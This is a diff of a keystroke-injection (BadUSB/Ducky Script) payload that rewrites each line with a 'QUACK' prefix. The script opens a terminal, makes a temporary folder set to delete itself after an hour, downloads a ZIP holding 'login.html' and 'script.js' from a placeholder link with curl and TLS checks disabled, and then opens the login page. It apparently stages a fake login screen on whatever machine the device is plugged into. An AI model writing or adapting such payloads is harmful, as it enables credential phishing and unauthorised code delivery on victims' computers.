@@ -16,39 +16,39 @@
 *     - 'ExecutionPolicy Bypass' if used in Windows 10/11
 
 
-DELAY 1000
-CTRL-ALT t
-DELAY 2000
+QUACK DELAY 1000
+QUACK CTRL-ALT t
+QUACK DELAY 2000
 
 
 * #### Main SECTION ####
 
 * Create a random directory
-STRING dir_name=$(mktemp -d)
-ENTER
-DELAY 500
+QUACK STRING dir_name=$(mktemp -d)
+QUACK ENTER
+QUACK DELAY 500
 
 * Delete the directory after 60 minutes (3600 seconds)
-STRING (sleep 3600 && rm -rf $dir_name) &
-ENTER
-DELAY 500
+QUACK STRING (sleep 3600 && rm -rf $dir_name) &
+QUACK ENTER
+QUACK DELAY 500
 
 * Move into the directory
-STRING cd $dir_name
-ENTER
-DELAY 500
+QUACK STRING cd $dir_name
+QUACK ENTER
+QUACK DELAY 500
 
 * Download the zip from your own link
 * REQUIRED - Replace example.com/file.zip with your own ZIP link. The zip should contian the files ['login.html', 'script.js']
-STRING curl -LOk "#ZIP_LINK"
-ENTER
-DELAY 500
+QUACK STRING curl -LOk "#ZIP_LINK"
+QUACK ENTER
+QUACK DELAY 500
 
 * Unzip it
-STRING unzip file.zip
-ENTER
-DELAY 500
+QUACK STRING unzip file.zip
+QUACK ENTER
+QUACK DELAY 500
 
 * Open the login page
-STRING xdg-open login.html; exit;
-ENTER
+QUACK STRING xdg-open login.html; exit;
+QUACK ENTER
